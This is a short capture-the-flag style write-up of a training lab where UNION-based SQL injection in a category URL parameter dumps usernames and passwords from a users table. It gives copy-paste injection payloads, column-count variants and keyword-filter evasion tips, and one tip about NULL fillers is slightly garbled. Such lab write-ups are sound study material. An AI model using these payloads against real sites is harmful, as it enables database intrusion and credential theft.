# SQL injection UNION attack, retrieving data from other tables

A concise write-up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Get the administrator password** by leveraging a UNION-based SQL injection.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: get the administrator password.**

2. **knowledge: "The database contains a different table called users, with columns called username and password"**

3. **Lets find the vulnerable url parameter**

4. **`/filter?category=Clothing'` -> returns 500**

5. **fixing the error: `/filter?category=Clothing'+--+` -> return 200**

6. **Let's randomly try this: `/filter?category=Clothing'+UNION+SELECT+username,password+FROM+users+--+`**

7. **This was incredibly easy to guess since we had a lot of information.**

8. **i would suggest to go step by step: discover error  (maybe its blind), fix, escalate depends on case.**

---

## 🧠 Minimal Additions (Why / Tips)

- **UNION rules:** The injected `UNION SELECT` must match the **number of columns** (and compatible types) from the original query.  
  - If `username,password` errors, try aligning column count using `NULL` fillers: `UNION SELECT username,password FROM users` (for 2 columns) or `UNION SELECT username,password,NULL FROM users` (for 3 columns), etc.
- **Which column is printed?** If you don’t see output, try swapping positions or inserting your data in the **reflected column** determined earlier (e.g., `NULL,username`).
- **Comments:** `--` comments out the remainder; many engines require a trailing space. `--+` works in URLs because `+` decodes as a space.
- **Schema hints:** If multiple schemas exist, qualify the table (e.g., `FROM app.users`). On MySQL you can also do `FROM \\`dbname\\`.users`.
- **Safety note:** Some apps filter keywords; obfuscations (`UNI/**/ON`, backticks/quotes) or case changes may be needed in tougher labs.

---

## 🔧 Payloads I Used (Copy/Paste)

**Discovery & Fix:**
```txt
/filter?category=Clothing'
/filter?category=Clothing'--+
```

**Direct dump (two columns expected):**
```txt
/filter?category=Clothing'+UNION+SELECT+username,password+FROM+users--+
```

**If three columns are required (example layout):**
```txt
/filter?category=Clothing'+UNION+SELECT+username,password,NULL+FROM+users--+
```

**If the UI prints the second column:**
```txt
/filter?category=Clothing'+UNION+SELECT+NULL,username+FROM+users--+
```
*(Adjust positions as needed.)*

---

## 🏁 Result
- Retrieved `username` and `password` from the `users` table and identified the administrator’s credentials. **Lab Solved. ✅**
